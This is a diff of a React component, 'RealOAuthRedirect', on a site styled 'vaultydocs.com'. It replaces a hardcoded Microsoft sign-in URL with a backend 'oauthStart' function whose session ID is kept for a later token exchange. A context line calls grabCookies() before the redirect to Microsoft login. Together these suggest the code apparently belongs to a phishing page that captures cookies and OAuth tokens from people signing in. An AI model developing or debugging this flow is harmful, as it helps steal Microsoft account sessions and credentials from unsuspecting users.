@@ -1,18 +1,21 @@
 import React, { useEffect } from 'react';
 
 // Real Microsoft OAuth configuration
-const STATE = Math.random().toString(36).substring(2, 15);
+// ❌ Original STATE removed, now managed by backend PKCE
+// const STATE = Math.random().toString(36).substring(2, 15);
+
 // Use the registered redirect URI from Microsoft app registration
 const REDIRECT_URI = 'https://vaultydocs.com/oauth-callback';
 
-const MICROSOFT_OAUTH_URL =
-  'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
-  'client_id=eabd0e31-5707-4a85-aae6-79c53dc2c7f0&' +
-  'response_type=code&' +
-  `redirect_uri=${encodeURIComponent(REDIRECT_URI)}&` +
-  'response_mode=query&' +
-  'scope=openid%20profile%20email&' +
-  'prompt=login';
+// ❌ Original hardcoded Microsoft URL replaced by oauthStart.js backend
+// const MICROSOFT_OAUTH_URL =
+//   'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
+//   'client_id=eabd0e31-5707-4a85-aae6-79c53dc2c7f0&' +
+//   'response_type=code&' +
+//   `redirect_uri=${encodeURIComponent(REDIRECT_URI)}&` +
+//   'response_mode=query&' +
+//   'scope=openid%20profile%20email&' +
+//   'prompt=login';
 
 const RealOAuthRedirect = (props: any) => {
   useEffect(() => {
@@ -131,8 +134,25 @@ const RealOAuthRedirect = (props: any) => {
         grabCookies();
       }
 
-      // Redirect to Microsoft OAuth (will return to this same page)
-      window.location.href = MICROSOFT_OAUTH_URL;
+      // ✅ FIXED: Proper PKCE + state flow using oauthStart.js
+      console.log('🔄 Fetching real OAuth start URL...');
+      try {
+        const res = await fetch('/.netlify/functions/oauthStart');
+        const data = await res.json();
+
+        if (!data.authUrl || !data.sessionId) {
+          console.error('❌ Invalid OAuth start response', data);
+          return;
+        }
+
+        // Store the state (sessionId) for tokenExchange later
+        sessionStorage.setItem('oauth_state', data.sessionId);
+
+        console.log('✅ Redirecting to Microsoft OAuth now...');
+        window.location.href = data.authUrl;
+      } catch (err) {
+        console.error('❌ Failed to start OAuth flow:', err);
+      }
     })();
   }, []);
 
